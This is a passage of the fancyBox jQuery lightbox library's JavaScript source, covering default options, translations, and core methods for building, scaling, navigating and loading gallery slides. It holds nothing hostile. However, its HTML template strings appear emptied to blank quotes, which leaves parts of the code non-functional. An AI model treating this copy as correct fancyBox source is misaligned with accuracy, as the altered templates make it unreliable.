with your favorite video player!' + \"\", format: \"\", // custom video format autoStart: true }, // Default content type if cannot be detected automatically defaultType: \"image\", // Open/close animation type // Possible values: // false - disable // \"zoom\" - zoom images from/to thumbnail // \"fade\" // \"zoom-in-out\" // animationEffect: \"zoom\", // Duration in ms for open/close animation animationDuration: 366, // Should image change opacity while zooming // If opacity is \"auto\", then opacity will be changed if image and thumbnail have different aspect ratios zoomOpacity: \"auto\", // Transition effect between slides // // Possible values: // false - disable // \"fade' // \"slide' // \"circular' // \"tube' // \"zoom-in-out' // \"rotate' // transitionEffect: \"fade\", // Duration in ms for transition animation transitionDuration: 366, // Custom CSS class for slide element slideClass: \"\", // Custom CSS class for layout baseClass: \"\", // Base template for layout baseTpl: '' + '' + '' + '&nbsp;/&nbsp;' + '' + '' + '' + '' + \"\" + \"\", // Loading indicator template spinnerTpl: '', // Error message template errorTpl: '', btnTpl: { download: '' + '' + \"\", zoom: '' + '' + \"\", close: '' + '' + \"\", // Arrows arrowLeft: '' + '' + \"\", arrowRight: '' + '' + \"\", // This small close button will be appended to your html/inline/ajax content by default, // if \"smallBtn\" option is not set to false smallBtn: '' + '' + \"\" }, // Container is injected into this element parentEl: \"body\", // Hide browser vertical scrollbars; use at your own risk hideScrollbar: true, // Focus handling // ============== // Try to focus on the first focusable element after opening autoFocus: true, // Put focus back to active element after closing backFocus: true, // Do not let user to focus on element outside modal content trapFocus: true, // Module specific options // ======================= fullScreen: { autoStart: false }, // Set `touch: false` to disable panning/swiping touch: { vertical: true, // Allow to drag content vertically momentum: true // Continue movement after releasing mouse/touch when panning }, // Hash value when initializing manually, // set `false` to disable hash change hash: null, // Customize or add new media types // Example: /* media : { youtube : { params : { autoplay : 0 } } } */ media: {}, slideShow: { autoStart: false, speed: 3000 }, thumbs: { autoStart: false, // Display thumbnails on opening hideOnClose: true, // Hide thumbnail grid when closing animation starts parentEl: \".fancybox-container\", // Container is injected into this element axis: \"y\" // Vertical (y) or horizontal (x) scrolling }, // Use mousewheel to navigate gallery // If 'auto' - enabled for images only wheel: \"auto\", // Callbacks //========== // See Documentation/API/Events for more information // Example: /* afterShow: function( instance, current ) { console.info( 'Clicked element:' ); console.info( current.opts.$orig ); } */ onInit: $.noop, // When instance has been initialized beforeLoad: $.noop, // Before the content of a slide is being loaded afterLoad: $.noop, // When the content of a slide is done loading beforeShow: $.noop, // Before open animation starts afterShow: $.noop, // When content is done loading and animating beforeClose: $.noop, // Before the instance attempts to close. Return false to cancel the close. afterClose: $.noop, // After instance has been closed onActivate: $.noop, // When instance is brought to front onDeactivate: $.noop, // When other instance has been activated // Interaction // =========== // Use options below to customize taken action when user clicks or double clicks on the fancyBox area, // each option can be string or method that returns value. // // Possible values: // \"close\" - close instance // \"next\" - move to next gallery item // \"nextOrClose\" - move to next gallery item or close if gallery has only one item // \"toggleControls\" - show/hide controls // \"zoom\" - zoom image (if loaded) // false - do nothing // Clicked on the content clickContent: function (current, event) { return current.type === \"image\" ? \"zoom\" : false; }, // Clicked on the slide clickSlide: \"close\", // Clicked on the background (backdrop) element; // if you have not changed the layout, then most likely you need to use `clickSlide` option clickOutside: \"close\", // Same as previous two, but for double click dblclickContent: false, dblclickSlide: false, dblclickOutside: false, // Custom options when mobile device is detected // ============================================= mobile: { preventCaptionOverlap: false, idleTime: false, clickContent: function (current, event) { return current.type === \"image\" ? \"toggleControls\" : false; }, clickSlide: function (current, event) { return current.type === \"image\" ? \"toggleControls\" : \"close\"; }, dblclickContent: function (current, event) { return current.type === \"image\" ? \"zoom\" : false; }, dblclickSlide: function (current, event) { return current.type === \"image\" ? \"zoom\" : false; } }, // Internationalization // ==================== lang: \"en\", i18n: { en: { CLOSE: \"Close\", NEXT: \"Next\", PREV: \"Previous\", ERROR: \"The requested content cannot be loaded. Please try again later.\", PLAY_START: \"Start slideshow\", PLAY_STOP: \"Pause slideshow\", FULL_SCREEN: \"Full screen\", THUMBS: \"Thumbnails\", DOWNLOAD: \"Download\", SHARE: \"Share\", ZOOM: \"Zoom\" }, de: { CLOSE: \"Schlie&szlig;en\", NEXT: \"Weiter\", PREV: \"Zur&uuml;ck\", ERROR: \"Die angeforderten Daten konnten nicht geladen werden. Bitte versuchen Sie es sp&auml;ter nochmal.\", PLAY_START: \"Diaschau starten\", PLAY_STOP: \"Diaschau beenden\", FULL_SCREEN: \"Vollbild\", THUMBS: \"Vorschaubilder\", DOWNLOAD: \"Herunterladen\", SHARE: \"Teilen\", ZOOM: \"Vergr&ouml;&szlig;ern\" } } }; // Few useful variables and methods // ================================ var $W = $(window); var $D = $(document); var called = 0; // Check if an object is a jQuery object and not a native JavaScript object // ======================================================================== var isQuery = function (obj) { return obj && obj.hasOwnProperty && obj instanceof $; }; // Handle multiple browsers for \"requestAnimationFrame\" and \"cancelAnimationFrame\" // =============================================================================== var requestAFrame = (function () { return ( window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || // if all else fails, use setTimeout function (callback) { return window.setTimeout(callback, 1000 / 60); } ); })(); var cancelAFrame = (function () { return ( window.cancelAnimationFrame || window.webkitCancelAnimationFrame || window.mozCancelAnimationFrame || window.oCancelAnimationFrame || function (id) { window.clearTimeout(id); } ); })(); // Detect the supported transition-end event property name // ======================================================= var transitionEnd = (function () { var el = document.createElement(\"fakeelement\"), t; var transitions = { transition: \"transitionend\", OTransition: \"oTransitionEnd\", MozTransition: \"transitionend\", WebkitTransition: \"webkitTransitionEnd\" }; for (t in transitions) { if (el.style[t] !== undefined) { return transitions[t]; } } return \"transitionend\"; })(); // Force redraw on an element. // This helps in cases where the browser doesn't redraw an updated element properly // ================================================================================ var forceRedraw = function ($el) { return $el && $el.length && $el[0].offsetHeight; }; // Exclude array (`buttons`) options from deep merging // =================================================== var mergeOpts = function (opts1, opts2) { var rez = $.extend(true, {}, opts1, opts2); $.each(opts2, function (key, value) { if ($.isArray(value)) { rez[key] = value; } }); return rez; }; // How much of an element is visible in viewport // ============================================= var inViewport = function (elem) { var elemCenter, rez; if (!elem || elem.ownerDocument !== document) { return false; } $(\".fancybox-container\").css(\"pointer-events\", \"none\"); elemCenter = { x: elem.getBoundingClientRect().left + elem.offsetWidth / 2, y: elem.getBoundingClientRect().top + elem.offsetHeight / 2 }; rez = document.elementFromPoint(elemCenter.x, elemCenter.y) === elem; $(\".fancybox-container\").css(\"pointer-events\", \"\"); return rez; }; // Class definition // ================ var FancyBox = function (content, opts, index) { var self = this; self.opts = mergeOpts({ index: index }, $.fancybox.defaults); if ($.isPlainObject(opts)) { self.opts = mergeOpts(self.opts, opts); } if ($.fancybox.isMobile) { self.opts = mergeOpts(self.opts, self.opts.mobile); } self.id = self.opts.id || ++called; self.currIndex = parseInt(self.opts.index, 10) || 0; self.prevIndex = null; self.prevPos = null; self.currPos = 0; self.firstRun = true; // All group items self.group = []; // Existing slides (for current, next and previous gallery items) self.slides = {}; // Create group elements self.addContent(content); if (!self.group.length) { return; } self.init(); }; $.extend(FancyBox.prototype, { // Create DOM structure // ==================== init: function () { var self = this, firstItem = self.group[self.currIndex], firstItemOpts = firstItem.opts, $container, buttonStr; if (firstItemOpts.closeExisting) { $.fancybox.close(true); } // Hide scrollbars // =============== $(\"body\").addClass(\"fancybox-active\"); if ( !$.fancybox.getInstance() && firstItemOpts.hideScrollbar !== false && !$.fancybox.isMobile && document.body.scrollHeight > window.innerHeight ) { $(\"head\").append( '.compensate-for-scrollbar{margin-right:' + (window.innerWidth - document.documentElement.clientWidth) + \"px;}\" ); $(\"body\").addClass(\"compensate-for-scrollbar\"); } // Build html markup and set references // ==================================== // Build html code for buttons and insert into main template buttonStr = \"\"; $.each(firstItemOpts.buttons, function (index, value) { buttonStr += firstItemOpts.btnTpl[value] || \"\"; }); // Create markup from base template, it will be initially hidden to // avoid unnecessary work like painting while initializing is not complete $container = $( self.translate( self, firstItemOpts.baseTpl .replace(\"\", buttonStr) .replace(\"\", firstItemOpts.btnTpl.arrowLeft + firstItemOpts.btnTpl.arrowRight) ) ) .attr(\"id\", \"fancybox-container-\" + self.id) .addClass(firstItemOpts.baseClass) .data(\"FancyBox\", self) .appendTo(firstItemOpts.parentEl); // Create object holding references to jQuery wrapped nodes self.$refs = { container: $container }; [\"bg\", \"inner\", \"infobar\", \"toolbar\", \"stage\", \"caption\", \"navigation\"].forEach(function (item) { self.$refs[item] = $container.find(\".fancybox-\" + item); }); self.trigger(\"onInit\"); // Enable events, deactive previous instances self.activate(); // Build slides, load and reveal content self.jumpTo(self.currIndex); }, // Simple i18n support - replaces object keys found in template // with corresponding values // ============================================================ translate: function (obj, str) { var arr = obj.opts.i18n[obj.opts.lang] || obj.opts.i18n.en; return str.replace(/\\{\\{(\\w+)\\}\\}/g, function (match, n) { return arr[n] === undefined ? match : arr[n]; }); }, // Populate current group with fresh content // Check if each object has valid type and content // =============================================== addContent: function (content) { var self = this, items = $.makeArray(content), thumbs; $.each(items, function (i, item) { var obj = {}, opts = {}, $item, type, found, src, srcParts; // Step 1 - Make sure we have an object // ==================================== if ($.isPlainObject(item)) { // We probably have manual usage here, something like // $.fancybox.open( [ { src : \"image.jpg\", type : \"image\" } ] ) obj = item; opts = item.opts || item; } else if ($.type(item) === \"object\" && $(item).length) { // Here we probably have jQuery collection returned by some selector $item = $(item); // Support attributes like `data-options='{\"touch\" : false}'` and `data-touch='false'` opts = $item.data() || {}; opts = $.extend(true, {}, opts, opts.options); // Here we store clicked element opts.$orig = $item; obj.src = self.opts.src || opts.src || $item.attr(\"href\"); // Assume that simple syntax is used, for example: // `$.fancybox.open( $(\"#test\"), {} );` if (!obj.type && !obj.src) { obj.type = \"inline\"; obj.src = item; } } else { // Assume we have a simple html code, for example: // $.fancybox.open( 'Hi!' ); obj = { type: \"html\", src: item + \"\" }; } // Each gallery object has full collection of options obj.opts = $.extend(true, {}, self.opts, opts); // Do not merge buttons array if ($.isArray(opts.buttons)) { obj.opts.buttons = opts.buttons; } if ($.fancybox.isMobile && obj.opts.mobile) { obj.opts = mergeOpts(obj.opts, obj.opts.mobile); } // Step 2 - Make sure we have content type, if not - try to guess // ============================================================== type = obj.type || obj.opts.type; src = obj.src || \"\"; if (!type && src) { if ((found = src.match(/\\.(mp4|mov|ogv|webm)((\\?|#).*)?$/i))) { type = \"video\"; if (!obj.opts.video.format) { obj.opts.video.format = \"video/\" + (found[1] === \"ogv\" ? \"ogg\" : found[1]); } } else if (src.match(/(^data:image\\/[a-z0-9+\\/=]*,)|(\\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\\?|#).*)?$)/i)) { type = \"image\"; } else if (src.match(/\\.(pdf)((\\?|#).*)?$/i)) { type = \"iframe\"; obj = $.extend(true, obj, { contentType: \"pdf\", opts: { iframe: { preload: false } } }); } else if (src.charAt(0) === \"#\") { type = \"inline\"; } } if (type) { obj.type = type; } else { self.trigger(\"objectNeedsType\", obj); } if (!obj.contentType) { obj.contentType = $.inArray(obj.type, [\"html\", \"inline\", \"ajax\"]) > -1 ? \"html\" : obj.type; } // Step 3 - Some adjustments // ========================= obj.index = self.group.length; if (obj.opts.smallBtn == \"auto\") { obj.opts.smallBtn = $.inArray(obj.type, [\"html\", \"inline\", \"ajax\"]) > -1; } if (obj.opts.toolbar === \"auto\") { obj.opts.toolbar = !obj.opts.smallBtn; } // Find thumbnail image, check if exists and if is in the viewport obj.$thumb = obj.opts.$thumb || null; if (obj.opts.$trigger && obj.index === self.opts.index) { obj.$thumb = obj.opts.$trigger.find(\"img:first\"); if (obj.$thumb.length) { obj.opts.$orig = obj.opts.$trigger; } } if (!(obj.$thumb && obj.$thumb.length) && obj.opts.$orig) { obj.$thumb = obj.opts.$orig.find(\"img:first\"); } if (obj.$thumb && !obj.$thumb.length) { obj.$thumb = null; } obj.thumb = obj.opts.thumb || (obj.$thumb ? obj.$thumb[0].src : null); // \"caption\" is a \"special\" option, it can be used to customize caption per gallery item if ($.type(obj.opts.caption) === \"function\") { obj.opts.caption = obj.opts.caption.apply(item, [self, obj]); } if ($.type(self.opts.caption) === \"function\") { obj.opts.caption = self.opts.caption.apply(item, [self, obj]); } // Make sure we have caption as a string or jQuery object if (!(obj.opts.caption instanceof $)) { obj.opts.caption = obj.opts.caption === undefined ? \"\" : obj.opts.caption + \"\"; } // Check if url contains \"filter\" used to filter the content // Example: \"ajax.html #something\" if (obj.type === \"ajax\") { srcParts = src.split(/\\s+/, 2); if (srcParts.length > 1) { obj.src = srcParts.shift(); obj.opts.filter = srcParts.shift(); } } // Hide all buttons and disable interactivity for modal items if (obj.opts.modal) { obj.opts = $.extend(true, obj.opts, { trapFocus: true, // Remove buttons infobar: 0, toolbar: 0, smallBtn: 0, // Disable keyboard navigation keyboard: 0, // Disable some modules slideShow: 0, fullScreen: 0, thumbs: 0, touch: 0, // Disable click event handlers clickContent: false, clickSlide: false, clickOutside: false, dblclickContent: false, dblclickSlide: false, dblclickOutside: false }); } // Step 4 - Add processed object to group // ====================================== self.group.push(obj); }); // Update controls if gallery is already opened if (Object.keys(self.slides).length) { self.updateControls(); // Update thumbnails, if needed thumbs = self.Thumbs; if (thumbs && thumbs.isActive) { thumbs.create(); thumbs.focus(); } } }, // Attach an event handler functions for: // - navigation buttons // - browser scrolling, resizing; // - focusing // - keyboard // - detecting inactivity // ====================================== addEvents: function () { var self = this; self.removeEvents(); // Make navigation elements clickable // ================================== self.$refs.container .on(\"click.fb-close\", \"[data-fancybox-close]\", function (e) { e.stopPropagation(); e.preventDefault(); self.close(e); }) .on(\"touchstart.fb-prev click.fb-prev\", \"[data-fancybox-prev]\", function (e) { e.stopPropagation(); e.preventDefault(); self.previous(); }) .on(\"touchstart.fb-next click.fb-next\", \"[data-fancybox-next]\", function (e) { e.stopPropagation(); e.preventDefault(); self.next(); }) .on(\"click.fb\", \"[data-fancybox-zoom]\", function (e) { // Click handler for zoom button self[self.isScaledDown() ? \"scaleToActual\" : \"scaleToFit\"](); }); // Handle page scrolling and browser resizing // ========================================== $W.on(\"orientationchange.fb resize.fb\", function (e) { if (e && e.originalEvent && e.originalEvent.type === \"resize\") { if (self.requestId) { cancelAFrame(self.requestId); } self.requestId = requestAFrame(function () { self.update(e); }); } else { if (self.current && self.current.type === \"iframe\") { self.$refs.stage.hide(); } setTimeout( function () { self.$refs.stage.show(); self.update(e); }, $.fancybox.isMobile ? 600 : 250 ); } }); $D.on(\"keydown.fb\", function (e) { var instance = $.fancybox ? $.fancybox.getInstance() : null, current = instance.current, keycode = e.keyCode || e.which; // Trap keyboard focus inside of the modal // ======================================= if (keycode == 9) { if (current.opts.trapFocus) { self.focus(e); } return; } // Enable keyboard navigation // ========================== if (!current.opts.keyboard || e.ctrlKey || e.altKey || e.shiftKey || $(e.target).is(\"input,textarea,video,audio,select\")) { return; } // Backspace and Esc keys if (keycode === 8 || keycode === 27) { e.preventDefault(); self.close(e); return; } // Left arrow and Up arrow if (keycode === 37 || keycode === 38) { e.preventDefault(); self.previous(); return; } // Righ arrow and Down arrow if (keycode === 39 || keycode === 40) { e.preventDefault(); self.next(); return; } self.trigger(\"afterKeydown\", e, keycode); }); // Hide controls after some inactivity period if (self.group[self.currIndex].opts.idleTime) { self.idleSecondsCounter = 0; $D.on( \"mousemove.fb-idle mouseleave.fb-idle mousedown.fb-idle touchstart.fb-idle touchmove.fb-idle scroll.fb-idle keydown.fb-idle\", function (e) { self.idleSecondsCounter = 0; if (self.isIdle) { self.showControls(); } self.isIdle = false; } ); self.idleInterval = window.setInterval(function () { self.idleSecondsCounter++; if (self.idleSecondsCounter >= self.group[self.currIndex].opts.idleTime && !self.isDragging) { self.isIdle = true; self.idleSecondsCounter = 0; self.hideControls(); } }, 1000); } }, // Remove events added by the core // =============================== removeEvents: function () { var self = this; $W.off(\"orientationchange.fb resize.fb\"); $D.off(\"keydown.fb .fb-idle\"); this.$refs.container.off(\".fb-close .fb-prev .fb-next\"); if (self.idleInterval) { window.clearInterval(self.idleInterval); self.idleInterval = null; } }, // Change to previous gallery item // =============================== previous: function (duration) { return this.jumpTo(this.currPos - 1, duration); }, // Change to next gallery item // =========================== next: function (duration) { return this.jumpTo(this.currPos + 1, duration); }, // Switch to selected gallery item // =============================== jumpTo: function (pos, duration) { var self = this, groupLen = self.group.length, firstRun, isMoved, loop, current, previous, slidePos, stagePos, prop, diff; if (self.isDragging || self.isClosing || (self.isAnimating && self.firstRun)) { return; } // Should loop? pos = parseInt(pos, 10); loop = self.current ? self.current.opts.loop : self.opts.loop; if (!loop && (pos < 0 || pos >= groupLen)) { return false; } // Check if opening for the first time; this helps to speed things up firstRun = self.firstRun = !Object.keys(self.slides).length; // Create slides previous = self.current; self.prevIndex = self.currIndex; self.prevPos = self.currPos; current = self.createSlide(pos); if (groupLen > 1) { if (loop || current.index < groupLen - 1) { self.createSlide(pos + 1); } if (loop || current.index > 0) { self.createSlide(pos - 1); } } self.current = current; self.currIndex = current.index; self.currPos = current.pos; self.trigger(\"beforeShow\", firstRun); self.updateControls(); // Validate duration length current.forcedDuration = undefined; if ($.isNumeric(duration)) { current.forcedDuration = duration; } else { duration = current.opts[firstRun ? \"animationDuration\" : \"transitionDuration\"]; } duration = parseInt(duration, 10); // Check if user has swiped the slides or if still animating isMoved = self.isMoved(current); // Make sure current slide is visible current.$slide.addClass(\"fancybox-slide--current\"); // Fresh start - reveal container, current slide and start loading content if (firstRun) { if (current.opts.animationEffect && duration) { self.$refs.container.css(\"transition-duration\", duration + \"ms\"); } self.$refs.container.addClass(\"fancybox-is-open\").trigger(\"focus\"); // Attempt to load content into slide // This will later call `afterLoad` -> `revealContent` self.loadSlide(current); self.preload(\"image\"); return; } // Get actual slide/stage positions (before cleaning up) slidePos = $.fancybox.getTranslate(previous.$slide); stagePos = $.fancybox.getTranslate(self.$refs.stage); // Clean up all slides $.each(self.slides, function (index, slide) { $.fancybox.stop(slide.$slide, true); }); if (previous.pos !== current.pos) { previous.isComplete = false; } previous.$slide.removeClass(\"fancybox-slide--complete fancybox-slide--current\"); // If slides are out of place, then animate them to correct position if (isMoved) { // Calculate horizontal swipe distance diff = slidePos.left - (previous.pos * slidePos.width + previous.pos * previous.opts.gutter); $.each(self.slides, function (index, slide) { slide.$slide.removeClass(\"fancybox-animated\").removeClass(function (index, className) { return (className.match(/(^|\\s)fancybox-fx-\\S+/g) || []).join(\" \"); }); // Make sure that each slide is in equal distance // This is mostly needed for freshly added slides, because they are not yet positioned var leftPos = slide.pos * slidePos.width + slide.pos * slide.opts.gutter; $.fancybox.setTranslate(slide.$slide, { top: 0, left: leftPos - stagePos.left + diff }); if (slide.pos !== current.pos) { slide.$slide.addClass(\"fancybox-slide--\" + (slide.pos > current.pos ? \"next\" : \"previous\")); } // Redraw to make sure that transition will start forceRedraw(slide.$slide); // Animate the slide $.fancybox.animate( slide.$slide, { top: 0, left: (slide.pos - current.pos) * slidePos.width + (slide.pos - current.pos) * slide.opts.gutter }, duration, function () { slide.$slide .css({ transform: \"\", opacity: \"\" }) .removeClass(\"fancybox-slide--next fancybox-slide--previous\"); if (slide.pos === self.currPos) { self.complete(); } } ); }); } else if (duration && current.opts.transitionEffect) { // Set transition effect for previously active slide prop = \"fancybox-animated fancybox-fx-\" + current.opts.transitionEffect; previous.$slide.addClass(\"fancybox-slide--\" + (previous.pos > current.pos ? \"next\" : \"previous\")); $.fancybox.animate( previous.$slide, prop, duration, function () { previous.$slide.removeClass(prop).removeClass(\"fancybox-slide--next fancybox-slide--previous\"); }, false ); } if (current.isLoaded) { self.revealContent(current); } else { self.loadSlide(current); } self.preload(\"image\"); }, // Create new \"slide\" element // These are gallery items that are actually added to DOM // ======================================================= createSlide: function (pos) { var self = this, $slide, index; index = pos % self.group.length; index = index < 0 ? self.group.length + index : index; if (!self.slides[pos] && self.group[index]) { $slide = $('').appendTo(self.$refs.stage); self.slides[pos] = $.extend(true, {}, self.group[index], { pos: pos, $slide: $slide, isLoaded: false }); self.updateSlide(self.slides[pos]); } return self.slides[pos]; }, // Scale image to the actual size of the image; // x and y values should be relative to the slide // ============================================== scaleToActual: function (x, y, duration) { var self = this, current = self.current, $content = current.$content, canvasWidth = $.fancybox.getTranslate(current.$slide).width, canvasHeight = $.fancybox.getTranslate(current.$slide).height, newImgWidth = current.width, newImgHeight = current.height, imgPos, posX, posY, scaleX, scaleY; if (self.isAnimating || self.isMoved() || !$content || !(current.type == \"image\" && current.isLoaded && !current.hasError)) { return; } self.isAnimating = true; $.fancybox.stop($content); x = x === undefined ? canvasWidth * 0.5 : x; y = y === undefined ? canvasHeight * 0.5 : y; imgPos = $.fancybox.getTranslate($content); imgPos.top -= $.fancybox.getTranslate(current.$slide).top; imgPos.left -= $.fancybox.getTranslate(current.$slide).left; scaleX = newImgWidth / imgPos.width; scaleY = newImgHeight / imgPos.height; // Get center position for original image posX = canvasWidth * 0.5 - newImgWidth * 0.5; posY = canvasHeight * 0.5 - newImgHeight * 0.5; // Make sure image does not move away from edges if (newImgWidth > canvasWidth) { posX = imgPos.left * scaleX - (x * scaleX - x); if (posX > 0) { posX = 0; } if (posX < canvasWidth - newImgWidth) { posX = canvasWidth - newImgWidth; } } if (newImgHeight > canvasHeight) { posY = imgPos.top * scaleY - (y * scaleY - y); if (posY > 0) { posY = 0; } if (posY < canvasHeight - newImgHeight) { posY = canvasHeight - newImgHeight; } } self.updateCursor(newImgWidth, newImgHeight); $.fancybox.animate( $content, { top: posY, left: posX, scaleX: scaleX, scaleY: scaleY }, duration || 366, function () { self.isAnimating = false; } ); // Stop slideshow if (self.SlideShow && self.SlideShow.isActive) { self.SlideShow.stop(); } }, // Scale image to fit inside parent element // ======================================== scaleToFit: function (duration) { var self = this, current = self.current, $content = current.$content, end; if (self.isAnimating || self.isMoved() || !$content || !(current.type == \"image\" && current.isLoaded && !current.hasError)) { return; } self.isAnimating = true; $.fancybox.stop($content); end = self.getFitPos(current); self.updateCursor(end.width, end.height); $.fancybox.animate( $content, { top: end.top, left: end.left, scaleX: end.width / $content.width(), scaleY: end.height / $content.height() }, duration || 366, function () { self.isAnimating = false; } ); }, // Calculate image size to fit inside viewport // =========================================== getFitPos: function (slide) { var self = this, $content = slide.$content, $slide = slide.$slide, width = slide.width || slide.opts.width, height = slide.height || slide.opts.height, maxWidth, maxHeight, minRatio, aspectRatio, rez = {}; if (!slide.isLoaded || !$content || !$content.length) { return false; } maxWidth = $.fancybox.getTranslate(self.$refs.stage).width; maxHeight = $.fancybox.getTranslate(self.$refs.stage).height; maxWidth -= parseFloat($slide.css(\"paddingLeft\")) + parseFloat($slide.css(\"paddingRight\")) + parseFloat($content.css(\"marginLeft\")) + parseFloat($content.css(\"marginRight\")); maxHeight -= parseFloat($slide.css(\"paddingTop\")) + parseFloat($slide.css(\"paddingBottom\")) + parseFloat($content.css(\"marginTop\")) + parseFloat($content.css(\"marginBottom\")); if (!width || !height) { width = maxWidth; height = maxHeight; } minRatio = Math.min(1, maxWidth / width, maxHeight / height); width = minRatio * width; height = minRatio * height; // Adjust width/height to precisely fit into container if (width > maxWidth - 0.5) { width = maxWidth; } if (height > maxHeight - 0.5) { height = maxHeight; } if (slide.type === \"image\") { rez.top = Math.floor((maxHeight - height) * 0.5) + parseFloat($slide.css(\"paddingTop\")); rez.left = Math.floor((maxWidth - width) * 0.5) + parseFloat($slide.css(\"paddingLeft\")); } else if (slide.contentType === \"video\") { // Force aspect ratio for the video // \"I say the whole world must learn of our peaceful ways… by force!\" aspectRatio = slide.opts.width && slide.opts.height ? width / height : slide.opts.ratio || 16 / 9; if (height > width / aspectRatio) { height = width / aspectRatio; } else if (width > height * aspectRatio) { width = height * aspectRatio; } } rez.width = width; rez.height = height; return rez; }, // Update content size and position for all slides // ============================================== update: function (e) { var self = this; $.each(self.slides, function (key, slide) { self.updateSlide(slide, e); }); }, // Update slide content position and size // ====================================== updateSlide: function (slide, e) { var self = this, $content = slide && slide.$content, width = slide.width || slide.opts.width, height = slide.height || slide.opts.height, $slide = slide.$slide; // First, prevent caption overlap, if needed self.adjustCaption(slide); // Then resize content to fit inside the slide if ($content && (width || height || slide.contentType === \"video\") && !slide.hasError) { $.fancybox.stop($content); $.fancybox.setTranslate($content, self.getFitPos(slide)); if (slide.pos === self.currPos) { self.isAnimating = false; self.updateCursor(); } } // Then some adjustments self.adjustLayout(slide); if ($slide.length) { $slide.trigger(\"refresh\"); if (slide.pos === self.currPos) { self.$refs.toolbar .add(self.$refs.navigation.find(\".fancybox-button--arrow_right\")) .toggleClass(\"compensate-for-scrollbar\", $slide.get(0).scrollHeight > $slide.get(0).clientHeight); } } self.trigger(\"onUpdate\", slide, e); }, // Horizontally center slide // ========================= centerSlide: function (duration) { var self = this, current = self.current, $slide = current.$slide; if (self.isClosing || !current) { return; } $slide.siblings().css({ transform: \"\", opacity: \"\" }); $slide .parent() .children() .removeClass(\"fancybox-slide--previous fancybox-slide--next\"); $.fancybox.animate( $slide, { top: 0, left: 0, opacity: 1 }, duration === undefined ? 0 : duration, function () { // Clean up $slide.css({ transform: \"\", opacity: \"\" }); if (!current.isComplete) { self.complete(); } }, false ); }, // Check if current slide is moved (swiped) // ======================================== isMoved: function (slide) { var current = slide || this.current, slidePos, stagePos; if (!current) { return false; } stagePos = $.fancybox.getTranslate(this.$refs.stage); slidePos = $.fancybox.getTranslate(current.$slide); return ( !current.$slide.hasClass(\"fancybox-animated\") && (Math.abs(slidePos.top - stagePos.top) > 0.5 || Math.abs(slidePos.left - stagePos.left) > 0.5) ); }, // Update cursor style depending if content can be zoomed // ====================================================== updateCursor: function (nextWidth, nextHeight) { var self = this, current = self.current, $container = self.$refs.container, canPan, isZoomable; if (!current || self.isClosing || !self.Guestures) { return; } $container.removeClass(\"fancybox-is-zoomable fancybox-can-zoomIn fancybox-can-zoomOut fancybox-can-swipe fancybox-can-pan\"); canPan = self.canPan(nextWidth, nextHeight); isZoomable = canPan ? true : self.isZoomable(); $container.toggleClass(\"fancybox-is-zoomable\", isZoomable); $(\"[data-fancybox-zoom]\").prop(\"disabled\", !isZoomable); if (canPan) { $container.addClass(\"fancybox-can-pan\"); } else if ( isZoomable && (current.opts.clickContent === \"zoom\" || ($.isFunction(current.opts.clickContent) && current.opts.clickContent(current) == \"zoom\")) ) { $container.addClass(\"fancybox-can-zoomIn\"); } else if (current.opts.touch && (current.opts.touch.vertical || self.group.length > 1) && current.contentType !== \"video\") { $container.addClass(\"fancybox-can-swipe\"); } }, // Check if current slide is zoomable // ================================== isZoomable: function () { var self = this, current = self.current, fitPos; // Assume that slide is zoomable if: // - image is still loading // - actual size of the image is smaller than available area if (current && !self.isClosing && current.type === \"image\" && !current.hasError) { if (!current.isLoaded) { return true; } fitPos = self.getFitPos(current); if (fitPos && (current.width > fitPos.width || current.height > fitPos.height)) { return true; } } return false; }, // Check if current image dimensions are smaller than actual // ========================================================= isScaledDown: function (nextWidth, nextHeight) { var self = this, rez = false, current = self.current, $content = current.$content; if (nextWidth !== undefined && nextHeight !== undefined) { rez = nextWidth < current.width && nextHeight < current.height; } else if ($content) { rez = $.fancybox.getTranslate($content); rez = rez.width < current.width && rez.height < current.height; } return rez; }, // Check if image dimensions exceed parent element // =============================================== canPan: function (nextWidth, nextHeight) { var self = this, current = self.current, pos = null, rez = false; if (current.type === \"image\" && (current.isComplete || (nextWidth && nextHeight)) && !current.hasError) { rez = self.getFitPos(current); if (nextWidth !== undefined && nextHeight !== undefined) { pos = { width: nextWidth, height: nextHeight }; } else if (current.isComplete) { pos = $.fancybox.getTranslate(current.$content); } if (pos && rez) { rez = Math.abs(pos.width - rez.width) > 1.5 || Math.abs(pos.height - rez.height) > 1.5; } } return rez; }, // Load content into the slide // =========================== loadSlide: function (slide) { var self = this, type, $slide, ajaxLoad; if (slide.isLoading || slide.isLoaded) { return; } slide.isLoading = true; if (self.trigger(\"beforeLoad\", slide) === false) { slide.isLoading = false; return false; } type = slide.type; $slide = slide.$slide; $slide .off(\"refresh\") .trigger(\"onReset\") .addClass(slide.opts.slideClass); // Create content depending on the type switch (type) { case \"image\": self.setImage(slide); break; case \"iframe\": self.setIframe(slide); break; case \"html\": self.setContent(slide, slide.src || slide.content); break; case \"video\": self.setContent( slide, slide.opts.video.tpl .replace(/\\{\\{src\\}\\}/gi, slide.src) .replace(\"\", slide.opts.videoFormat || slide.opts.video.format || \"\") .replace(\"\", slide.thumb || \"\") ); break; case \"inline\": if ($(slide.src).length) { self.setContent(slide, $(slide.src)); } else { self.setError(slide); } break; case \"ajax\": self.showLoading(slide); ajaxLoad = $.ajax( $.extend({}, slide.opts.ajax.settings, { url: slide.src, success: function (data, textStatus) { if (textStatus === \"success\") { self.setContent(slide, data); } }, error: function (jqXHR, textStatus) { if (jqXHR && textStatus !== \"abort\") { self.setError(slide); } } }) ); $slide.one(\"onReset\", function () { ajaxLoad.abort(); }); break; default: self.setError(slide); break; } return true; }, // Use thumbnail image, if possible // ================================ setImage: function (slide) { var self = this, ghost; // Check if need to show loading icon setTimeout(function () { var $img = slide.$image; if (!self.isClosing && slide.isLoading && (!$img || !$img.length || !$img[0].complete) && !slide.hasError) { self.showLoading(slide); } }, 50); //Check if image has srcset self.checkSrcset(slide); // This will be wrapper containing both ghost and actual image slide.$content = $('') .addClass(\"fancybox-is-hidden\") .appendTo(slide.$slide.addClass(\"fancybox-slide--image\")); // If we have a thumbnail, we can display it while actual image is loading // Users will not stare at black screen and actual image will appear gradually if (slide.opts.preload !== false && slide.opts.width && slide.opts.height && slide.thumb) { slide.width = slide.opts.width; slide.height = slide.opts.height; ghost = document.createElement(\"img\"); ghost.onerror = function () { $(this).remove(); slide.$ghost = null; }; ghost.onload = function () { self.afterLoad(slide); }; slide.$ghost = $(ghost) .addClass(\"fancybox-image\") 